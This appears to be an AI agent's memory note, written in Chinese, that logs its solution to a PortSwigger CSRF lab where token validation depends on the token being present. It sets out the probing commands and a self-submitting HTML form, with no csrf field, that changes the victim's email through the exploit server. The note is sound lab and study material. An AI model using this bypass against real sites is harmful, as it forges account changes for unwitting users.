---
metadata:
  node_type: memory
name: "PRS arm A lab-token-validation-depends-on-token-being-present"
description: "arm A 基线:lab-token-validation-depends-on-token-being-present 冷实例一次通过 - 省略 csrf 参数即跳过校验(带假 token 400),缺参表单经 exploit server DELIVER_TO_VICTIM 交付改 victim 邮箱,banner solved"
last_updated: 2026-10-09T07:38:12+08:00
created: 2026-10-09T07:38:12+08:00
---

## 实例
- 题:`/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present`
- `range_launch launch-url <academy 路径> --jar /tmp/cj1.json` 直接成功(reused:false,instance_url 一次性给出);lab_id 464b3ce6...
- 基线横幅 is-notsolved;exploit server 存在(exploit-0ac300fa...,lab 页 `#exploit-link` 可见)

## 解法链(件面)
1. `http_session get /login` → 取登录 csrf(gT8BXFCqy...)
2. `http_session post /login --form csrf/username=wiener/password=peter` → 302 /my-account?id=wiener,会话写入 jar
3. 双探针判定向量:
   - 对照:`post /my-account/change-email --form email=... --form csrf=bogusvalue` → **400 `"Invalid CSRF token"`**
   - 题眼:`post /my-account/change-email --form email=...`(完全省略 csrf 参数)→ **302 /my-account?id=wiener** 接受
   ⇒ 令牌校验以「参数是否存在」为门,缺参即整段校验跳过
4. `http_session post <exploit-server>/ --form formAction=STORE --form urlIsHttps=on --form responseFile=/exploit --form responseHead=... --form responseBody=<自提交表单>`
   载荷:无 csrf 的 `<form action="https://<instance>/my-account/change-email" method="POST">` + 隐藏 email + `document.forms[0].submit()`
5. 交付:同字段 + `formAction=DELIVER_TO_VICTIM`,并 `--follow`
6. 判 solved:交付响应第三跳页面横幅 `is-solved` + `banner_verdict` 独立复核 solved:true

## 坑(可复用)
- **DELIVER_TO_VICTIM 只带 responseFile 会 400 `"Missing parameter responseHead"`** —— 与 ACCESS_LOG(禁止带 responseFile/responseBody,否则覆盖已存载荷)相反,交付腿必须把 STORE 的整套字段(head+body)原样重发;浏览器表单本来就是整体提交。
- `http_session --form` 值走 `url::form_urlencoded::append_pair`,真换行直接编成 %0A;因此 responseHead 的换行要在 args JSON 字符串里写真实 `\n` 转义,写两字符 `\n` 只会得到 %5Cn。
- 交付 302 链跳 `/deliver-to-victim` → `/`,不 `--follow` 则受害者不被召来。

## 结果
一次通过,无回归;用时约 1 分钟(launch 22.7s)。
